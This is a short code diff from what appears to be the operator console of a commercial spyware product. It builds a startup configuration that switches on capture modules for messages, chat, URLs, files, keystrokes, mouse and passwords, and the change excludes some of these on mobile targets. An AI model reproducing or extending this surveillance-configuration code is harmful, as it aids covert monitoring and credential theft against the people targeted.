@@ -18,7 +18,6 @@ package it.ht.rcs.console.operations.view.configuration.basic
     
     private static function buildConfigInternal(model:Object, newConfig:Object):void
     {
-      
       var actions:Array = [];
       var events:Array = [];
       
@@ -30,11 +29,13 @@ package it.ht.rcs.console.operations.view.configuration.basic
       if (model.messages) { subactions.push({action: "module", module: "messages",    status: "start"});
                             subactions.push({action: "module", module: "chat",        status: "start"}); }
       if (model.url)        subactions.push({action: "module", module: "url",         status: "start"});
-      if (model.file)     { subactions.push({action: "module", module: "file",        status: "start"}); configureFileModule(model, newConfig); }
       if (model.keylog)   { subactions.push({action: "module", module: "keylog",      status: "start"});
+                            if (!model.isMobile) {
                             subactions.push({action: "module", module: "mouse",       status: "start"});
                             subactions.push({action: "module", module: "password",    status: "start"}); }
-      
+                          }
+      if (model.file &&
+         !model.isMobile) { subactions.push({action: "module", module: "file",        status: "start"}); configureFileModule(model, newConfig); }      
       
       var startupEvent:Object =  {event: "timer", subtype: "startup", start: 0, ts: "00:00:00", te: "23:59:59", enabled: true, desc: "STARTUP"};
       var startupAction:Object = {desc: "STARTUP", subactions: subactions};
